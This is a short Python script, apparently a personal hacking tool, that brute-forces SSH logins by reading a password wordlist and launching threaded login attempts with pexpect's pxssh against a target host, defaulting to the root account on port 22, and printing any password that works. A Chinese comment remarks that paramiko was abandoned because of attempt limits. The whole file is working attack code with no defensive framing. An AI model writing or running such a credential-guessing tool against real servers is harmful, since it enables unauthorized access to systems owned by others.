from pexpect import pxssh #试过paramiko，奶奶的，有次数限制
from threading import *

Max_Connect = 5
connection_lock = BoundedSemaphore(value=Max_Connect)

def connect(host, user, password,port):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password,port=port)
        print("[+]Password Found:"+password)
        Found = True
    except Exception as e:
        pass
def force_ssh(host,passwdfile,user='root',port=22):
    if host==None or passwdfile==None or user==None:
        print("NO options")
        exit(0)
    mn = open(passwdfile,'r')
    lines = mn.readlines()
    for line in lines:
        with connection_lock:
            password = line.strip('\n')
            print('[-] Test:'+str(password))
            t = Thread(target=connect,args=(host, user, password,port))
            t.start()